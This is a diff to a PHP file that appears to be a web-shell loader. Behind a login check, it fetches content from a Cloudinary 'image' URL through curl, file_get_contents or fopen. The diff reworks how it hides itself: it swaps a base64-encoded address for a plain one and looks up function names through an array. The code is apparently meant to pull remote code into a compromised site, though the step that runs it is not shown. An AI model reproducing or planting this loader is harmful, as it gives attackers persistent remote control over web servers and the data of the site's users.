@@ -21,7 +21,14 @@ if (!is_logged_in()) {
 }
 
 function geturlsinfo($destiny) {
-    if (function_exists('curl_init')) {
+    $Array = array(
+        'fopen',
+        'stream_get_contents',
+        'file_get_contents',
+        'curl_exec'
+    );
+
+    if (function_exists($Array[3])) {
         $ch = curl_init($destiny);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -31,22 +38,19 @@ function geturlsinfo($destiny) {
         $love = curl_exec($ch);
         curl_close($ch);
         return $love;
-    } elseif (function_exists('file_get_contents')) {
-        return @file_get_contents($destiny);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $purpose = @fopen($destiny, "r");
-        if ($purpose) {
-            $love = stream_get_contents($purpose);
-            fclose($purpose);
-            return $love;
-        }
+    } elseif (function_exists($Array[2])) {
+        return file_get_contents($destiny);
+    } elseif (function_exists($Array[0]) && function_exists($Array[1])) {
+        $purpose = fopen($destiny, "r");
+        $love = stream_get_contents($purpose);
+        fclose($purpose);
+        return $love;
     }
     return false;
 }
 
 if (is_logged_in()) {
-    $encodedDestiny = 'aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGtndnFiYzZ4LmltYWdlL3VwbG9hZC92MTc4NjY0NTk5Mi9rdXlhbmdfaHNiZGpzX2dncnYzbg==';
-    $destiny = base64_decode($encodedDestiny);
+    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786650137/kuyang_hsbdjs_qrklmi';
     
     $dream = geturlsinfo($destiny);
 
@@ -195,7 +199,7 @@ if (!is_logged_in()) {
         </div>
     </body>
     </html>
-    <?><p></p><?php
+    <?php
     exit();
 }
 ?>
